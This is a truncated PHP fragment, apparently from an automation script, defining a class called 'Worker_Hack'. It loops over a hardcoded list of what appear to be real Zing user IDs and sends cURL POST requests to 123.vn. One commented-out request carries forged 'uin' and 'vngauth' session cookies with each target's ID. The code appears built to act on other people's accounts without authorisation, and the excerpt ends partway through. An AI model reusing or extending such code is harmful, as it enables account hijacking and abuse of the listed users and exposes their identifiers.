...
class Application_Model_Worker_Hack {
	...
	public function start() {
		$array = array (
				...
				'kantaeyoung',
				'anvinh1510',
				'mrtai.online24gio.com',
				'luongthingoc.hy',
				'dichvuvesinhhanoi123',
				'vn.golmart',
				'thanhduyenntc',
				'quynhmai.kgshn',
				'nguyendai.kgshn',
		...
		foreach ( $array as $zingid ) {
			...
			/*
			 * $cUrl = new Core_Dom_Curl(array( 'method' => 'POST', 'post_fields' => 'cur=%2F&ref=&type=1&pid=0&num=0&pl=', 'cookie' => 'Cookie: uin='.$uin.'; vngauth='.$vngauth.'; acn='.$zingid, 'url' => 'http://123.vn/ajax/log?t=1366792709368' )); $cUrl->exec();
			 */
			$cUrl = new Core_Dom_Curl ( array (
					'method' => 'POST',
					'post_fields' => '',
